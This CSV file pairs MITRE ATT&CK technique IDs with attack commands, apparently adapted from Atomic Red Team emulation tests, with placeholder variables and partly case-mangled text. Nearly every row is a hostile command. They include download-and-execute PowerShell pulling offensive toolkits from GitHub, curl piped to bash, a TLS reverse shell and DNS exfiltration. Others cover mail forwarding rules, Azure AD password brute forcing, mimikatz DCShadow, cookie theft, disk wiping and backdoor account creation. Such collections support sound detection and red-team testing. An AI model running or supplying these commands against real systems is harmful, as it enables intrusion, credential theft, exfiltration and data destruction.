mitre_id,command
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } }   "
T1016,ipconfig /all netsh interface show interface arp -a nbtstat -n net config
T1078,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') safedump -consoleoutput -noninteractive # id_9939
T1114,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds new-inboxrule -name ""#{rule_name}"" -forwardto ""#{forwarding_email}"" # id_4454"
T1021,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v portnumber /t reg_dword /d #{new_remote_port} /f netsh advfirewall firewall add rule name=""rdpportlatest-tcp-in"" dir=in action=allow protocol=tcp localport=#{new_remote_port} # id_1646"
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh # id_3329
T1098,"import-module msonline $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-msolservice -credential $credential add-msolrolemember -rolename ""company administrator"" -rolememberemailaddress ""#{target_user}"""
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""ping 8.8.8.8`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1497,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""virtualization environment detected""; fi "
T1112,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmpin /t reg_dword /d 2 /f"
T1197,start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file} 
T1018,"([adsisearcher]""objectcategory=computer"").findall(); ([adsisearcher]""objectcategory=computer"").findone() # id_4924"
T1046,sudo nmap -ss #{network_range} -p #{port} telnet #{host} #{port} nc -nv #{host} #{port}
T1505,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path ""c:\windows\system32\termsrv.dll"" -destination ""c:\windows\system32\termsrv_backup.dll"" -erroraction ignore add-content -path ""c:\windows\system32\termsrv.dll"" -value ""`n"" -nonewline -erroraction ignore move-item -path ""c:\windows\system32\termsrv_backup.dll"" -destination ""c:\windows\system32\termsrv.dll"" -force -erroraction ignore # id_7360"
T1114,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds new-inboxrule -name ""#{rule_name}"" -forwardto ""#{forwarding_email}"""
T1047,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""#{new_class}"") $newclass.put() invoke-wmimethod -path #{new_class} -name create -argumentlist #{process_to_execute} # id_9986"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow""  "
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base #{base} -permutations ""#{wordlist}"" -outputfile ""#{output_file}"" # id_3803"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f # id_5514
T1106,IEX(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING('HTTPS://RAW.GITHUBUSERCONTENT.COM/S3CUR3TH1SSH1T/GET-SYSTEM-TECHNIQUES/MASTER/CREATEPROCESS/GET-CREATEPROCESSSYSTEM.PS1')
T1518,PGREP -L 'BAREOS-FD|ICINGA2|CBAGENTD|WAZUH-AGENT|PACKETBEAT|FILEBEAT|OSQUERYD'
T1049,get-nettcpconnection   
T1652,kextfind   
T1531,"CONNECT-AZUREAD $USERPRINCIPALNAME = ""#{USERPRINCIPALNAME}"" REMOVE-AZUREADUSER -OBJECTID $USERPRINCIPALNAME"
T1046,sudo nmap -ss #{network_range} -p #{port} telnet #{host} #{port} nc -nv #{host} #{port}
T1529,halt -r
T1485,cipher.exe /w:c:
T1048,"import-module ""#{ps_module}"" invoke-dnsexfiltrator -i ""#{ps_module}"" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}  "
T1036,"copy ""#{exe_path}"" %temp%\t1036.007_masquerading.docx.exe /y copy ""#{exe_path}"" %temp%\t1036.007_masquerading.pdf.exe /y copy ""#{exe_path}"" %temp%\t1036.007_masquerading.ps1.exe /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.xls.vbs /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.xlsx.vbs /y copy ""#{vbs_path}"" %temp%\t1036.007_masquerading.png.vbs /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.doc.ps1 /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.pdf.ps1 /y copy ""#{ps1_path}"" %temp%\t1036.007_masquerading.rtf.ps1 /y %temp%\t1036.007_masquerading.docx.exe %temp%\t1036.007_masquerading.pdf.exe %temp%\t1036.007_masquerading.ps1.exe %temp%\t1036.007_masquerading.xls.vbs %temp%\t1036.007_masquerading.xlsx.vbs %temp%\t1036.007_masquerading.png.vbs c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.doc.ps1 c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.pdf.ps1 c:\windows\system32\windowspowershell\v1.0\powershell.exe -file %temp%\t1036.007_masquerading.rtf.ps1"
T1489,sc.exe stop #{service_name}
T1110,useradd -g wheel -s /bin/bash -p $(openssl passwd -1 password123) art su art cd /tmp curl -s #{remote_url} |bash # id_7943
T1486,"set-content -path ""#{file_to_encrypt_location}"" -value ""populating this file with some text"" # create the test.txt file again in case prereqs failed cmd /c ""`""c:\program files (x86)\gnupg\bin\gpg.exe`"" --passphrase 'someparaphraseblah' --batch --yes -c `""#{file_to_encrypt_location}`"""""
T1072,"""%programfiles(x86)%/#{radmin_exe}"""
T1135,[NET.SERVICEPOINTMANAGER]::SECURITYPROTOCOL = [NET.SECURITYPROTOCOLTYPE]::TLS12 IEX (IWR 'HTTPS://RAW.GITHUBUSERCONTENT.COM/POWERSHELLMAFIA/POWERSPLOIT/F94A5D298A1B4C5DFB1F30A246D9C73D13B22888/RECON/POWERVIEW.PS1' -USEBASICPARSING); FIND-DOMAINSHARE -CHECKSHAREACCESS -VERBOSE
T1531,"$pword = convertto-securestring -string #{super_pass} -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{super_user}, $pword if((get-aduser #{remove_user} -properties memberof).memberof -like ""cn=domain admins*""){ remove-adgroupmember -identity ""domain admins"" -members #{remove_user} -credential $credential -confirm:$false } else{ write-host ""error - make sure #{remove_user} is in the domain admins group"" -foregroundcolor red } # id_7238"
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file # id_6547"
T1569,sc.exe sdset scmanager d:(a;;ka;;;wd)
T1614,chcp
T1546,"add-content #{ps_profile} -value """" add-content #{ps_profile} -value ""start-process #{exe_path}"" powershell -command exit"
T1222,#{COMPILED_FILE} #{SOURCE_FILE}
T1120,get-printer # id_6987
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh   
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1553,BCDEDIT /SET TESTSIGNING ON
T1202,pcalua.exe -a #{process} pcalua.exe -a #{payload_path}
T1136,"useradd -g 0 -m -d /root -s /bin/bash #{username} if [ $(cat /etc/os-release | grep -i 'name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;"
T1040,"""c:\program files\wireshark\tshark.exe"" -i #{interface} -c 5 "
T1136,"az login $userprincipalname = ""#{userprincipalname}"" $username = ""#{username}"" $password = ""#{password}"" az ad user create --display-name $username --password $password --user-principal-name $userprincipalname az ad user list --filter ""displayname eq 'atomicredteam'"""
T1027,"""pathtoatomicsfolder\..\externalpayloads\temp_t1027js.zip\t1027js.js"""
T1110,"import-module -name azuread $passwords = ""#{passwords}"".split(""{`n}"") foreach($password in $passwords) { $pword = convertto-securestring -string ""$password"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword try { write-host "" [-] attempting ${password} on account #{username}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{username}:${password} are valid credentials!`r`n"" break } catch { write-host "" [-] #{username}:${password} invalid credentials.`r`n"" } } write-host ""end of bruteforce""   "
T1007,powershell.exe get-service  
T1105,rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path} # id_7322
T1526,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $regions = ""#{regions}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile get-awsdiscoverydata -regions $regions -outputdirectory ""#{output_directory}"" remove-blankfiles -outputdirectory ""#{output_directory}"" # id_2979"
T1552,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') passhunt -local $true -noninteractive
T1221,"start ""#{docx_file}"""
T1202,"# copy command to clipboard set-clipboard -value '#{command}' # open run dialog start-process -filepath ""powershell"" -argumentlist ""-c (new-object -comobject 'shell.application').filerun()"" -windowstyle hidden # wait for run dialog to open start-sleep -seconds 1 # paste command and execute add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait('^v') start-sleep -milliseconds 500 [system.windows.forms.sendkeys]::sendwait('{enter}')   "
T1569,"sc.exe create ""werfaultsvc"" binpath= ""$env:windir\winsxs\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\werfault.exe"" displayname= ""werfault service"" start= auto  "
T1490,sc sdset vss d:(d;;ga;;;nu)(d;;ga;;;wd)(d;;ga;;;an)s:(au;fa;ga;;;wd)(au;oiiofa;ga;;;wd)
T1046,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') bluekeep -noninteractive -consoleoutput # id_3596
T1055,#{exe_binary}
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh 
T1187,RPCPING -S #{SERVER_IP} -E #{CUSTOM_PORT} /A CONNECT /U NTLM 1>$NULL
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()} # id_9454"
T1123,$mic = get-audiodevice -recording set-audiodevice -id $mic.id start-sleep -seconds 5 # id_3430
T1201,cat /etc/login.defs # id_8026
T1563,"QUERY USER SC.EXE CREATE SESSHIJACK BINPATH= ""CMD.EXE /K TSCON #{SESSION_ID} /DEST:#{DESTINATION_ID}"" NET START SESSHIJACK"
T1648,"import-module ""pathtoatomicsfolder/t1648/src/t1648-1/lambdaattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1648/src/t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region   "
T1613,podman build -t t1613 $pathtoatomicsfolder/t1613/src/ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)
T1041,"$dnsserver = ""#{dns_server}"" $exfiltrateddata = ""#{exfiltrated_data}"" $chunksize = #{chunk_size} $encodeddata = [system.text.encoding]::utf8.getbytes($exfiltrateddata) $encodeddata = [convert]::tobase64string($encodeddata) $chunks = $encodeddata -split ""(.{$chunksize})"" foreach ($chunk in $chunks) { $dnsquery = $chunk + ""."" + $dnsserver resolve-dnsname -name $dnsquery start-sleep -seconds 5 } "
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
